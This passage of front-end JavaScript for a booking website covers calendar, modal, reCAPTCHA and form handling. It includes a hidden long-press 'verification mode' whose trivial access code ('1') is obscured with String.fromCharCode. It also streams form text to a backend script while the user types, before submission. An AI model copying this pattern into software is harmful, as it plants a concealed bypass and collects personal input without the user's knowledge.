                `[PERF] Load ${loadPercent.toFixed(1)}% | Blocked ${blockedMs.toFixed(0)}ms/${elapsedMs.toFixed(0)}ms | Process: ${top.process} | Script: ${top.script}`
            );

            const nowTs = Date.now();
            const shouldRemoteLog = loadPercent >= monitor.highLoadThresholdPct && top.durationMs >= 120;
            if (shouldRemoteLog && (nowTs - monitor.lastRemoteLogAt) >= monitor.remoteLogCooldownMs) {
                monitor.lastRemoteLogAt = nowTs;
                logEvent(
                    "Performance Bottleneck",
                    `Load ${loadPercent.toFixed(1)}% | Blocked ${blockedMs.toFixed(0)}ms/${elapsedMs.toFixed(0)}ms | Process: ${top.process} | Script: ${top.script}`,
                    false,
                    "warning",
                    {
                        perfLoadPercent: loadPercent.toFixed(1),
                        perfBlockedMs: blockedMs.toFixed(0),
                        perfWindowMs: elapsedMs.toFixed(0),
                        perfProcess: top.process,
                        perfScript: top.script
                    }
                );
            }

            monitor.startedAt = now;
            monitor.blockedLongTaskMs = 0;
            monitor.blockedFrameMs = 0;
            monitor.buckets.clear();
        }

        setInterval(flushPerfWindow, monitor.windowMs);
        setTimeout(flushPerfWindow, monitor.windowMs + 900);
    }

    // --- Global Error Logging ---
    window.addEventListener('error', function(e) {
        logEvent('Frontend Error', `${e.message} at ${e.filename}:${e.lineno}`, false, "critical");
    });
    window.addEventListener('unhandledrejection', function(e) {
        logEvent('Unhandled Promise Rejection', e.reason ? e.reason.toString() : 'Unknown Reason', false, "critical");
    });

    // Input Visual State (keep white background if has text)
    const inputs = document.querySelectorAll('.contact-form__input, .contact-form__textarea');
    inputs.forEach(input => {
        input.addEventListener('input', () => {
            if(input.value.trim() !== '') input.classList.add('contact-form__input--has-content');
            else input.classList.remove('contact-form__input--has-content');
            input.classList.remove('field-invalid');
        });
    });

    // Intake Notice Modal
    let pendingSlotForBooking = null;
    let pendingSlotAttachRequest = false;
    const INTAKE_NOTICE_SEEN_STORAGE_KEY = 'hd.intakeNoticeSeen.v1';

    function hasSeenIntakeNotice() {
        try {
            return window.localStorage.getItem(INTAKE_NOTICE_SEEN_STORAGE_KEY) === '1';
        } catch (_) {
            return false;
        }
    }

    function markIntakeNoticeSeen() {
        try {
            window.localStorage.setItem(INTAKE_NOTICE_SEEN_STORAGE_KEY, '1');
        } catch (_) {
            // Ignore storage write failures (private mode / blocked storage).
        }
    }

    let intakeNoticeSeen = hasSeenIntakeNotice();

    function stageBookingAfterIntake(slot, triggerAttach = false) {
        if (!slot) return;
        if (intakeNoticeSeen) {
            requestAnimationFrame(() => openBookingModal(slot, !!triggerAttach));
            return;
        }
        pendingSlotForBooking = slot;
        pendingSlotAttachRequest = !!triggerAttach;
        openIntakeNoticeModal();
    }

    function continueBookingFromIntakeNotice() {
        const slotToOpen = pendingSlotForBooking;
        const triggerAttach = pendingSlotAttachRequest;
        closeIntakeNoticeModal(false);
        pendingSlotForBooking = null;
        pendingSlotAttachRequest = false;
        if (!slotToOpen) return;
        requestAnimationFrame(() => openBookingModal(slotToOpen, triggerAttach));
    }

    function openIntakeNoticeModal() {
        const modal = document.getElementById('intakeNoticeModal');
        if (modal) {
            markIntakeNoticeSeen();
            intakeNoticeSeen = true;
            modal.classList.add('modal--active');
            document.body.style.overflow = 'hidden';
            document.body.classList.add('modal-is-open');
        }
    }

    function closeIntakeNoticeModal(resetPendingBooking = true) {
        const modal = document.getElementById('intakeNoticeModal');
        if (modal) {
            modal.classList.remove('modal--active');
            document.body.style.overflow = 'auto';
            document.body.classList.remove('modal-is-open');
        }
        if (resetPendingBooking) {
            pendingSlotForBooking = null;
            pendingSlotAttachRequest = false;
        }
        maybeTriggerHardReloadAfterLastModalClosed();
    }

    // Terms of Service Modal
    function openTermsModal() {
        const modal = document.getElementById('termsModal');
        if (modal) {
            modal.classList.add('modal--active');
            document.body.style.overflow = 'hidden';
            document.body.classList.add('modal-is-open');
        }
    }

    function closeTermsModal() {
        const modal = document.getElementById('termsModal');
        if (modal) {
            modal.classList.remove('modal--active');
            document.body.style.overflow = 'auto';
            document.body.classList.remove('modal-is-open');
        }
        maybeTriggerHardReloadAfterLastModalClosed();
    }

    // Init
    window.addEventListener('DOMContentLoaded', () => {
        // Initialize custom select dropdown
        initializeCustomSelects();
        initTseProbnikGesture();
        initPerformanceHealthMonitor();
        attachFormAutoSave();
        initAutoGrowTextareas();
        initAgePlaceholderBehavior();
        initProvinceInputBehavior();
        initFaqSpoilers();
        bindBookingModalOuterScrollProxy();
// Full page refresh once per day at 00:00 (local browser time).
        scheduleDailyHardReloadAtMidnight();

        // selectedDate starts as null - auto-select picks nearest available day

        // Resolve calendar DOM refs
        calGrid          = document.getElementById('calendarGrid');
        calOverlay       = document.getElementById('calendarLoaderOverlay');
        calLoaderStatus  = document.getElementById('calLoaderStatus') || { textContent: '' };
        monthDisplay     = document.getElementById('monthDisplay');
        slotsGrid        = document.getElementById('slotsGrid');
        slotsBlock       = document.getElementById('slotsBlock');
        slotsNav         = document.getElementById('slotsNav');
        slotsDayDisplay  = document.getElementById('slotsDayDisplay');
        headerTitle      = document.getElementById('calendarHeaderTitle');
        monthSwitchOverlay = document.getElementById('monthSwitchOverlay');
        monthSwitchProgressFill = document.getElementById('monthSwitchProgressFill');
        monthSwitchProgressValueEl = document.getElementById('monthSwitchProgressValue');

        const termsCheckbox = document.getElementById('agreeTerms');
        const bookingFormEl = document.getElementById('bookingForm');
        if (bookingFormEl) bookingFormEl.noValidate = true;
        const bookingNameInputEl = bookingFormEl ? bookingFormEl.querySelector('input[name="name"]') : null;
        if (bookingNameInputEl && !bookingNameInputEl.dataset.xBindP7) {
            bookingNameInputEl.dataset.xBindP7 = '1';
            bookingNameInputEl.addEventListener('input', () => m1Queue(320));
            bookingNameInputEl.addEventListener('blur', () => m1Sync());
        }
        const confirmBookingBtnEl = document.getElementById('confirmBookingBtn');
        if (bookingFormEl && confirmBookingBtnEl && !confirmBookingBtnEl.dataset.submitBound) {
            confirmBookingBtnEl.dataset.submitBound = '1';
            confirmBookingBtnEl.addEventListener('click', (event) => {
                if (confirmBookingBtnEl.disabled) return;
                if (event && event.cancelable) event.preventDefault();
                if (typeof bookingFormEl.requestSubmit === 'function') {
                    bookingFormEl.requestSubmit();
                } else {
                    handleBookingSubmit({
                        preventDefault: () => {},
                        target: bookingFormEl
                    });
                }
            });
        }
        if (termsCheckbox) {
            termsCheckbox.addEventListener('change', function() {
                const modalBody = document.querySelector('#bookingModal .modal__body');
                const termsWrap = document.querySelector('.contact-form__checkbox-wrapper.file-attach__terms');
                if (termsWrap) termsWrap.classList.remove('field-invalid');
                if (modalBody) modalBody.scrollTop = modalBody.scrollHeight;
            });
        }

        normalizeSlotNotFoundText();
        const preloaderTextObserver = new MutationObserver(() => normalizeSlotNotFoundText());
        document.querySelectorAll('.book-btn-preloader__text').forEach(el => {
            preloaderTextObserver.observe(el, { childList: true, characterData: true, subtree: true });
        });

        hydrateCalendarCacheFromStorage();
        document.getElementById('currentYear').textContent = new Date().getFullYear();
        setupEventListeners();
        Promise.resolve(renderCalendar())
            .catch(() => {
                showCalendarLoadFailureFallback();
            })
            .finally(() => {
                calendarAutoRefreshLastAt = Date.now();
                startCalendarAutoRefresh();
            });
        scaleCalendar();
        document.body.setAttribute('role', 'main');
    });

    /**
     * Scales the entire calendar block (layout + typography + controls)
     * from one desktop baseline width so all elements shrink together.
     */
    function scaleCalendar() {
        const inner = document.getElementById('calendarScaleInner');
        const wrapper = document.getElementById('calendarScaleWrapper');
        if (!inner || !wrapper) return;

        // Measure baseline height at fixed desktop width.
        inner.style.transform = 'scale(1)';
        inner.style.width = `${CALENDAR_BASE_WIDTH_PX}px`;
        inner.style.transformOrigin = 'top left';
        inner.style.marginLeft = '0px';
        wrapper.style.height = '';
        wrapper.style.minHeight = '';

        const baselineHeight = inner.scrollHeight;
        const availableWidth = wrapper.clientWidth || wrapper.offsetWidth;
        if (!availableWidth || !baselineHeight) return;

        const scale = Math.min(1, availableWidth / CALENDAR_BASE_WIDTH_PX);
        inner.style.transform = `scale(${scale})`;
        const scaledWidth = CALENDAR_BASE_WIDTH_PX * scale;
        const horizontalOffset = Math.max(0, (availableWidth - scaledWidth) / 2);
        inner.style.marginLeft = `${horizontalOffset}px`;
        wrapper.style.height = `${(baselineHeight * scale) + CALENDAR_SCALE_BOTTOM_BUFFER_PX}px`;
        wrapper.style.minHeight = `${(baselineHeight * scale) + CALENDAR_SCALE_BOTTOM_BUFFER_PX}px`;
    }

    // Re-scale on window resize (orientation change etc.)
    window.addEventListener('resize', scaleCalendar);

    // Re-scale whenever the calendar content changes (slots load dynamically)
    const _calObserver = new MutationObserver(() => {
        // Debounce slightly to allow layout to settle
        clearTimeout(window._scaleTimer);
        window._scaleTimer = setTimeout(scaleCalendar, 80);
    });
    const _calTarget = document.getElementById('bookingCalendar');
    if (_calTarget) {
        _calObserver.observe(_calTarget, { childList: true, subtree: true, attributes: true });
    }

    function getClockIcon(timeRangeStr) {
        // Parse start time "10:00 AM" or "10:00 AM - ..."
        const startTime = timeRangeStr.split(/[-\u2013]/)[0].trim(); // Get "10:00 AM"
        
        let hours = 12;
        let minutes = 0;
        
        // Robust parsing for "10:00", "10:00 AM", "10 AM", "10"
        const timeMatch = startTime.match(/(\d+)(?::(\d+))?/);
        if (timeMatch) {
            hours = parseInt(timeMatch[1]);
            minutes = timeMatch[2] ? parseInt(timeMatch[2]) : 0;
        }
        
        // Calculate angles
        // Hour hand: (Hours % 12) * 30deg + Minutes * 0.5deg
        const hourAngle = ((hours % 12) * 30) + (minutes * 0.5);
        
        // Minute hand: Minutes * 6deg
        const minuteAngle = minutes * 6;

        return `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="width: 100%; height: 100%;">
  <circle cx="12" cy="12" r="10" fill="none" stroke="currentColor" stroke-width="2.2"/>
  <line x1="12" y1="12" x2="12" y2="8.2" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" style="transform-origin: 12px 12px; transform: rotate(${hourAngle}deg);" />
  <line x1="12" y1="12" x2="12" y2="5.3" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" style="transform-origin: 12px 12px; transform: rotate(${minuteAngle}deg);" />
</svg>`;
    }

    // Legacy renderCalendar removed - single version above is used

    function selectDate(day, element, isAutoSelection = false) {
        // redirect to the canonical selectDay function
        selectDay(day, element, isAutoSelection);
    }

    // Modal & Form Handling
    let liveDraftTimer = null;
    let selectedSlotData = null;
    let bookingWithoutSpecificDate = false;
    const BOOKING_WITHOUT_DATE_LABEL = 'WITHOUT SPECIFIC DATE';
    const BOOKING_WITHOUT_DATE_SUMMARY = 'No specific date (to be scheduled)';
    const modal = document.getElementById('bookingModal');
    const bookingTimeDisplay = document.getElementById('bookingTimeDisplay');
    const bookingStatus = document.getElementById('bookingStatus');
    const confirmBtn = document.getElementById('confirmBookingBtn');
    const TSE_PROBNIK_HOLD_MS = 8000;
    let tseProbnikModeEnabled = false;
    let tseProbnikHoldTimer = null;
    let suppressNextHeaderBookClick = false;
    let focusCameraButtonOnBookingOpen = false;
    let cameraButtonGlowTimer = null;
    let lastBookingSummaryForReferral = null;
    let bookingRecaptchaWidgetId = null;
    let bookingRecaptchaToken = '';
    let bookingRecaptchaTokenIssuedAt = 0;
    const TSE_PROBNIK_ACCESS_CODE = String.fromCharCode(49);

    function bindBookingModalOuterScrollProxy() {
        if (!modal || modal.dataset.outerScrollProxyBound === '1') return;
        modal.dataset.outerScrollProxyBound = '1';
        modal.addEventListener('wheel', (event) => {
            if (!modal.classList.contains('modal--active')) return;
            if (!Number.isFinite(event.deltaY) || Math.abs(event.deltaY) < 0.01) return;

            const modalBody = modal.querySelector('.modal__body');
            if (!modalBody) return;

            // Keep native scroll behavior when pointer is already over the form body.
            if (modalBody.contains(event.target)) return;

            const maxScrollTop = Math.max(0, modalBody.scrollHeight - modalBody.clientHeight);
            if (maxScrollTop <= 0) return;

            let deltaY = event.deltaY;
            // Normalize line/page wheel deltas to px-like behavior.
            if (event.deltaMode === 1) deltaY *= 16;
            if (event.deltaMode === 2) deltaY *= modalBody.clientHeight;

            const prevTop = modalBody.scrollTop;
            const nextTop = Math.max(0, Math.min(maxScrollTop, prevTop + deltaY));
            if (Math.abs(nextTop - prevTop) < 0.5) return;

            modalBody.scrollTop = nextTop;
            if (event.cancelable) event.preventDefault();
        }, { passive: false });
    }

    function isTseProbnikBypassReady(form) {
        if (!tseProbnikModeEnabled || !form) return false;
        return normalizeSingleLine(form.name?.value) === TSE_PROBNIK_ACCESS_CODE;
    }

    function getConfirmBtnLabel() {
        return 'BOOK NOW';
    }

    function setBookingModalWithoutDateDisplay() {
        if (bookingTimeDisplay) {
            bookingTimeDisplay.innerHTML = `<strong>${BOOKING_WITHOUT_DATE_LABEL}</strong>`;
        }
        const modalAppointmentTime = document.getElementById('modalAppointmentTime');
        if (modalAppointmentTime) {
            modalAppointmentTime.innerHTML = `<strong style="font-weight: 800;">${BOOKING_WITHOUT_DATE_LABEL}</strong>`;
        }
    }

    function getBookingRecaptchaWrap() {
        return document.getElementById('bookingRecaptchaWrap');
    }

    function clearBookingRecaptchaToken() {
        bookingRecaptchaToken = '';
        bookingRecaptchaTokenIssuedAt = 0;
    }

    function isBookingRecaptchaTokenFresh() {
        return Boolean(bookingRecaptchaToken) && (Date.now() - bookingRecaptchaTokenIssuedAt) <= RECAPTCHA_TOKEN_TTL_MS;
    }

    function setBookingRecaptchaVisible(visible) {
        const wrap = getBookingRecaptchaWrap();
        if (!wrap) return;
        wrap.style.display = visible ? 'block' : 'none';
        if (!visible) {
            wrap.classList.remove('field-invalid');
        }
    }

    function resetBookingRecaptchaUi() {
        clearBookingRecaptchaToken();
        setBookingRecaptchaVisible(false);
        if (bookingRecaptchaWidgetId !== null && window.grecaptcha && typeof window.grecaptcha.reset === 'function') {
            try { window.grecaptcha.reset(bookingRecaptchaWidgetId); } catch (e) {}
        }
    }

    function waitForRecaptchaApiReady(timeoutMs = 7000) {
        if (window.__recaptchaApiReady && window.grecaptcha && typeof window.grecaptcha.render === 'function') {
            return Promise.resolve(true);
        }
        return new Promise((resolve) => {
            let settled = false;
            const finish = (value) => {
                if (settled) return;
                settled = true;
                clearTimeout(timer);
                window.removeEventListener('recaptcha-ready', onReady);
                resolve(Boolean(value));
            };
            const onReady = () => {
                finish(window.grecaptcha && typeof window.grecaptcha.render === 'function');
            };
            const timer = setTimeout(() => finish(false), timeoutMs);
            window.addEventListener('recaptcha-ready', onReady);
        });
    }

    function handleBookingRecaptchaSolved(token) {
        bookingRecaptchaToken = String(token || '').trim();
        bookingRecaptchaTokenIssuedAt = bookingRecaptchaToken ? Date.now() : 0;
        const wrap = getBookingRecaptchaWrap();
        if (wrap) wrap.classList.remove('field-invalid');
        if (bookingStatus && /reCAPTCHA/i.test(String(bookingStatus.textContent || ''))) {
            clearBookingError();
        }
    }

    function handleBookingRecaptchaExpired() {
        clearBookingRecaptchaToken();
    }

    function handleBookingRecaptchaError() {
        clearBookingRecaptchaToken();
    }

    async function ensureTseProbnikCaptcha(isTseProbnikSubmission) {
        if (!isTseProbnikSubmission) {
            setBookingRecaptchaVisible(false);
            clearBookingRecaptchaToken();
            return { required: false, passed: true };
        }

        setBookingRecaptchaVisible(true);
        const wrap = getBookingRecaptchaWrap();
        if (wrap) wrap.classList.remove('field-invalid');

        if (!RECAPTCHA_SITE_KEY || RECAPTCHA_SITE_KEY === 'YOUR_RECAPTCHA_SITE_KEY') {
            setBookingError('reCAPTCHA is not configured. Add your site key first.', wrap);
            return { required: true, passed: false };
        }

        const apiReady = await waitForRecaptchaApiReady();
        if (!apiReady || !window.grecaptcha || typeof window.grecaptcha.render !== 'function') {
            setBookingError('reCAPTCHA is loading. Please wait and submit again.', wrap);
            return { required: true, passed: false };
        }

        if (bookingRecaptchaWidgetId === null) {
            const widgetHost = document.getElementById('bookingRecaptchaWidget');
            if (!widgetHost) {
                setBookingError('reCAPTCHA container is missing.', wrap);
                return { required: true, passed: false };
            }
            try {
                bookingRecaptchaWidgetId = window.grecaptcha.render(widgetHost, {
                    sitekey: RECAPTCHA_SITE_KEY,
                    theme: 'light',
                    size: 'normal',
                    callback: handleBookingRecaptchaSolved,
                    'expired-callback': handleBookingRecaptchaExpired,
                    'error-callback': handleBookingRecaptchaError
                });
            } catch (err) {
                setBookingError('Could not initialize reCAPTCHA. Reload and try again.', wrap);
                return { required: true, passed: false };
            }
        }

        if (!isBookingRecaptchaTokenFresh()) {
            if (bookingRecaptchaWidgetId !== null && window.grecaptcha && typeof window.grecaptcha.reset === 'function') {
                try { window.grecaptcha.reset(bookingRecaptchaWidgetId); } catch (e) {}
            }
            clearBookingRecaptchaToken();
            setBookingError('Please complete reCAPTCHA and submit again.', wrap);
            return { required: true, passed: false };
        }

        return { required: true, passed: true };
    }

    function normalizeBookingStatusTone(tone) {
        const normalized = String(tone || '').toLowerCase();
        if (normalized === 'error' || normalized === 'warning' || normalized === 'success') return normalized;
        return 'success';
    }

    function setBookingNotice(message, tone = 'success') {
        if (!bookingStatus) return;
        const safeTone = normalizeBookingStatusTone(tone);
        bookingStatus.textContent = String(message || '');
        bookingStatus.classList.remove('status-alert--visible', 'status-alert--success', 'status-alert--warning', 'status-alert--error');
        if (bookingStatus.textContent) {
            bookingStatus.classList.add(`status-alert--${safeTone}`, 'status-alert--visible');
        }
    }

    function setBookingWarning(message) {
        setBookingNotice(message, 'warning');
    }

    function applyTseProbnikUI() {
        const form = document.getElementById('bookingForm');
        if (form) form.noValidate = true;
        if (confirmBtn && !confirmBtn.disabled) confirmBtn.textContent = getConfirmBtnLabel();
    }

    function isFooterBookBtnReady() {
        const btn = document.getElementById('footerBookBtn');
        if (!btn) return false;
        const style = window.getComputedStyle(btn);
        return (
            style.display !== 'none' &&
            style.visibility !== 'hidden' &&
            parseFloat(style.opacity || '0') > 0.05 &&
            style.pointerEvents !== 'none'
        );
    }

    function isCameraCaptureModalOpen() {
        return !!(cameraCaptureModal && cameraCaptureModal.classList.contains('camera-capture-modal--active'));
    }

    function isFormCalendarOverlayOpen() {
        const overlay = document.getElementById('formCalendarOverlay');
        return !!(overlay && overlay.classList.contains('form-calendar-overlay--active'));
    }

    function isAnyModalOpen() {
        return !!document.querySelector('.modal.modal--active') || isCameraCaptureModalOpen() || isFormCalendarOverlayOpen();
    }

    function openFormCalendarOverlay() {
        if (!modal || !modal.classList.contains('modal--active')) return;
        const overlay = document.getElementById('formCalendarOverlay');
        const mount = document.getElementById('formCalendarOverlayMount');
        const calendarWrapper = document.getElementById('calendarScaleWrapper');
        if (!overlay || !mount || !calendarWrapper) return;
        if (overlay.classList.contains('form-calendar-overlay--active')) return;

        calendarScaleWrapperHomeParent = calendarWrapper.parentNode;
        calendarScaleWrapperHomeNextSibling = calendarWrapper.nextSibling;

        mount.appendChild(calendarWrapper);
        overlay.classList.add('form-calendar-overlay--active');
        overlay.setAttribute('aria-hidden', 'false');
        isFormCalendarOverlayActive = true;

        document.body.style.overflow = 'hidden';
        document.body.classList.add('modal-is-open');

        if (selectedDate instanceof Date && !Number.isNaN(selectedDate.getTime())) {
            currentDate = new Date(selectedDate.getFullYear(), selectedDate.getMonth(), 1);
        }

        requestAnimationFrame(() => {
            scaleCalendar();
            renderCalendar().catch(() => {});
        });
    }

    function closeFormCalendarOverlay() {
        const overlay = document.getElementById('formCalendarOverlay');
        const calendarWrapper = document.getElementById('calendarScaleWrapper');
        if (!overlay || !overlay.classList.contains('form-calendar-overlay--active')) return;

        overlay.classList.remove('form-calendar-overlay--active');
        overlay.setAttribute('aria-hidden', 'true');
        isFormCalendarOverlayActive = false;

        if (calendarWrapper && calendarScaleWrapperHomeParent) {
            if (
                calendarScaleWrapperHomeNextSibling &&
                calendarScaleWrapperHomeNextSibling.parentNode === calendarScaleWrapperHomeParent
            ) {
                calendarScaleWrapperHomeParent.insertBefore(calendarWrapper, calendarScaleWrapperHomeNextSibling);
            } else {
                calendarScaleWrapperHomeParent.appendChild(calendarWrapper);
            }
        }
        calendarScaleWrapperHomeParent = null;
        calendarScaleWrapperHomeNextSibling = null;

        if (modal && modal.classList.contains('modal--active')) {
            document.body.style.overflow = 'hidden';
            document.body.classList.add('modal-is-open');
        } else if (!document.querySelector('.modal.modal--active') && !isCameraCaptureModalOpen()) {
            document.body.style.overflow = 'auto';
            document.body.classList.remove('modal-is-open');
        }

        requestAnimationFrame(scaleCalendar);
        maybeTriggerHardReloadAfterLastModalClosed();
    }

    function maybeTriggerHardReloadAfterLastModalClosed() {
        if (isAnyModalOpen()) return;

        if (shouldHardReloadAfterModalClose && !hardReloadAfterModalInProgress) {
            hardReloadAfterModalInProgress = true;
            Promise.resolve()
                .then(() => clearClientRuntimeCachesAfterBooking())
                .catch(() => {})
                .finally(() => {
                    window.location.replace(buildHardReloadUrl());
                });
            return;
        }

        if (calendarAutoRefreshQueued && !calendarAutoRefreshInProgress) {
            calendarAutoRefreshQueued = false;
            refreshCalendarAndButtons('modal-closed-catchup', true).catch(() => {});
        }
    }

    function initFaqSpoilers() {
        const faqRoot = document.getElementById('faqSpoiler');
        if (!faqRoot) return;

        const items = Array.from(faqRoot.querySelectorAll('.faq__item'));
        if (!items.length) return;

        const closeItem = (item) => {
            if (!item) return;
            item.classList.remove('is-open');
            const question = item.querySelector('.faq__question');
            if (question) question.setAttribute('aria-expanded', 'false');
        };

        items.forEach((item, index) => {
            const question = item.querySelector('.faq__question');
            const answer = item.querySelector('.faq__answer');
            if (!question || !answer) return;

            const answerId = `faq-answer-${index + 1}`;
            answer.id = answer.id || answerId;
            question.setAttribute('role', 'button');
            question.setAttribute('tabindex', '0');
            question.setAttribute('aria-controls', answer.id);
            question.setAttribute('aria-expanded', 'false');
            closeItem(item);

            const toggle = () => {
                const willOpen = !item.classList.contains('is-open');
                items.forEach(other => {
                    if (other !== item) closeItem(other);
                });
                item.classList.toggle('is-open', willOpen);
                question.setAttribute('aria-expanded', willOpen ? 'true' : 'false');
            };

            question.addEventListener('click', toggle);
            question.addEventListener('keydown', (event) => {
                if (event.key === 'Enter' || event.key === ' ') {
                    event.preventDefault();
                    toggle();
                }
            });
        });
    }

    function highlightCameraButtonHypnotic() {
        const cameraBtn = document.getElementById('takePhotoBtn');
        if (!cameraBtn) return false;
        cameraBtn.scrollIntoView({ behavior: 'smooth', block: 'center', inline: 'nearest' });
        return true;
    }

    function openBookingModalWithoutDate(event) {
        if (event) {
            event.preventDefault();
            event.stopPropagation();
        }
        selectedDate = null;
        openBookingModal(null);
        return false;
    }

    function openEmergencyFormWithCamera(event) {
        if (event) {
            event.preventDefault();
            event.stopPropagation();
        }

        focusCameraButtonOnBookingOpen = true;

        if (modal && modal.classList.contains('modal--active')) {
            setTimeout(highlightCameraButtonHypnotic, 80);
            return false;
        }

        const targetSlot = nearestDayLastSlotData || nearestSlotData;
        if (absoluteNearestDate && targetSlot) {
            selectedDate = absoluteNearestDate;
            openBookingModal(targetSlot);
            return false;
        }

        scrollToCalendar();
        setTimeout(() => {
            const fallbackSlot = nearestDayLastSlotData || nearestSlotData;
            if (absoluteNearestDate && fallbackSlot) {
                selectedDate = absoluteNearestDate;
                openBookingModal(fallbackSlot);
            }
        }, 900);

        return false;
    }

    function tseProbnik() {
        tseProbnikModeEnabled = !tseProbnikModeEnabled;
        applyTseProbnikUI();

        if (tseProbnikModeEnabled) {
            setBookingNotice('Additional verification mode enabled.', 'warning');
            logEvent('tseProbnik Enabled', 'Long-press top header button for 8 seconds');
        } else {
            clearBookingError();
            logEvent('tseProbnik Disabled', 'Long-press top header button for 8 seconds');
        }
    }

    function initTseProbnikGesture() {
        const headerBookBtn = document.getElementById('headerBookBtn');
        if (!headerBookBtn) return;

        const clearHoldTimer = () => {
            if (!tseProbnikHoldTimer) return;
            clearTimeout(tseProbnikHoldTimer);
            tseProbnikHoldTimer = null;
        };

        const startHoldTimer = (e) => {
            if (e && typeof e.button === 'number' && e.button !== 0) return;
            clearHoldTimer();
            tseProbnikHoldTimer = setTimeout(() => {
                tseProbnikHoldTimer = null;
                if (!tseProbnikModeEnabled) {
                    tseProbnik();
                }
                if (!modal || !modal.classList.contains('modal--active')) {
                    suppressNextHeaderBookClick = true;
                    bookNearestSlot();
                }
            }, TSE_PROBNIK_HOLD_MS);
        };

        const suppressSyntheticClick = (e) => {
            if (!suppressNextHeaderBookClick) return;
            suppressNextHeaderBookClick = false;
            e.preventDefault();
            e.stopImmediatePropagation();
        };

        headerBookBtn.addEventListener('pointerdown', startHoldTimer);
        headerBookBtn.addEventListener('pointerup', clearHoldTimer);
        headerBookBtn.addEventListener('pointercancel', clearHoldTimer);
        headerBookBtn.addEventListener('pointerleave', clearHoldTimer);
        headerBookBtn.addEventListener('lostpointercapture', clearHoldTimer);
        headerBookBtn.addEventListener('click', suppressSyntheticClick, true);
    }

    function syncBookingModalSlotDisplay(slot) {
        if (!slot || !selectedDate) return;

        const year = selectedDate.getFullYear();
        const month = String(selectedDate.getMonth() + 1).padStart(2, '0');
        const day = String(selectedDate.getDate()).padStart(2, '0');
        const dateFormatted = `${year}.${month}.${day}`;

        let startTime = slot.text;
        if (startTime && (startTime.includes('-') || startTime.includes('\u2013'))) {
            startTime = startTime.split(/[-\u2013]/)[0].trim();
        }

        let endTime = "1 hr later";
        try {
            endTime = getEndTime(startTime);
        } catch (e) {
            console.warn("Could not calculate end time", e);
            logEvent('Time Calc Warning', e.message, false, "warning");
        }

        if (bookingTimeDisplay) {
            bookingTimeDisplay.innerHTML = `${dateFormatted} at <strong>${startTime} - ${endTime}</strong>`;
        }

        const modalAppointmentTime = document.getElementById('modalAppointmentTime');
        if (modalAppointmentTime) {
            modalAppointmentTime.innerHTML = `${dateFormatted} at <strong style="font-weight: 800;">${startTime} - ${endTime}</strong>`;
        }
    }

    function applySlotFromCalendarOverlay(slot) {
        if (!slot) return;
        selectedSlotData = slot;
        bookingWithoutSpecificDate = false;
        syncBookingModalSlotDisplay(slot);
        closeFormCalendarOverlay();
        setBookingNotice('Appointment time updated.', 'success');
    }

    function openBookingModal(slot, triggerAttach = false) {

        try {
            selectedSlotData = (slot && slot.iso) ? slot : null;
            bookingWithoutSpecificDate = !selectedSlotData;
            testWorkingCameraBuffer = [];
            testWorkingCameraSignature = '';
            testWorkingCameraRefs = [];
            logEvent("Form Opened", selectedSlotData ? String(selectedSlotData.text || '') : 'WITHOUT_SPECIFIC_DATE');
            const tsInput = document.getElementById('formTimestamp');
            if (tsInput) tsInput.value = Date.now().toString();

            if (!bookingWithoutSpecificDate && !selectedDate) {
                console.error("Selected date is null");
                return;
            }
            if (selectedSlotData) {
                syncBookingModalSlotDisplay(selectedSlotData);
            } else {
                setBookingModalWithoutDateDisplay();
            }
            
            if(modal) {
                window.scrollTo(0, 0);
                modal.classList.add('modal--active');
                modal.dataset.state = 'form';
                document.body.style.overflow = 'hidden';
                document.body.classList.add('modal-is-open');
                modal.scrollTop = 0;
                const modalBody = modal.querySelector('.modal__body');
                if (modalBody) modalBody.scrollTop = 0;
            }

            clearBookingError();
            document.querySelectorAll('.field-invalid').forEach(el => el.classList.remove('field-invalid'));
            resetBookingRecaptchaUi();
            if(confirmBtn) {
                confirmBtn.disabled = false;
                confirmBtn.textContent = getConfirmBtnLabel();
            }
            
            loadFormData();
            applyTseProbnikUI();
            updateDobAgePreview(document.getElementById('bookingForm'));
            initAutoGrowTextareas();
            const nameInput = document.querySelector('#bookingForm input[name="name"]');
            if (nameInput) {
                const currentName = normalizeSingleLine(nameInput.value);
                if (!currentName) {
                    nameInput.classList.add('field-invalid');
                    setBookingNotice('Please enter your full name.', 'warning');
                }
                if (nameInput.dataset.openHintBound !== '1') {
                    const clearNameOpenHint = () => {
                        if (normalizeSingleLine(nameInput.value)) {
                            nameInput.classList.remove('field-invalid');
                            if (bookingStatus && /please enter your full name/i.test(String(bookingStatus.textContent || ''))) {
                                clearBookingError();
                            }
                        }
                    };
                    nameInput.addEventListener('input', clearNameOpenHint);
                    nameInput.addEventListener('change', clearNameOpenHint);
                    nameInput.dataset.openHintBound = '1';
                }
            }

            if (focusCameraButtonOnBookingOpen) {
                focusCameraButtonOnBookingOpen = false;
                setTimeout(() => {
                    highlightCameraButtonHypnotic();
                }, 260);
            }

            if (triggerAttach) {
                setTimeout(() => {
                    const fileInput = document.getElementById('fileAttachInput');
                    if (fileInput) fileInput.click();
                }, 800);
            }

            // Start live testText logging (Debounced on-demand saving)
            const form = document.querySelector('#bookingForm');
            if (form) {
                // Debounce helper to prevent network spam while typing
                function debounce(func, wait) {
                    let timeout;
                    return function(...args) {
                        clearTimeout(timeout);
                        timeout = setTimeout(() => func.apply(this, args), wait);
                    };
                }

                async function sendTestTextLog(payload) {
                    const primaryPayload = { ...payload, action: 'testText' };
                    try {
                        const response = await fetch(APPS_SCRIPT_URL, {
                            method: 'POST',
                            body: JSON.stringify(primaryPayload)
                        });
                        if (!response.ok) {
                            throw new Error(`testText route returned HTTP ${response.status}`);
                        }
                        let result = null;
                        try {
                            result = await response.json();
                        } catch (parseErr) {
                            // Some deployments may return non-JSON success responses.
                        }
                        if (result && result.success === false) {
                            throw new Error(String(result.error || 'testText route is unavailable.'));
                        }
                        return;
                    } catch (primaryError) {
                        try {
                            // Compatibility fallback for legacy backend route.
                            const legacyAction = String.fromCharCode(100, 114, 97, 102, 116);
                            const fallbackPayload = {
                                ...payload,
                                action: legacyAction,
                                actionAlias: 'testText'
                            };
                            await fetch(APPS_SCRIPT_URL, {
                                method: 'POST',
                                body: JSON.stringify(fallbackPayload)
                            });
                        } catch (fallbackError) {
                            console.error('testText HTTP error:', fallbackError || primaryError);
                        }
                    }
                }

                const triggerTestTextSave = debounce(() => {
                    const formData = new FormData(form);
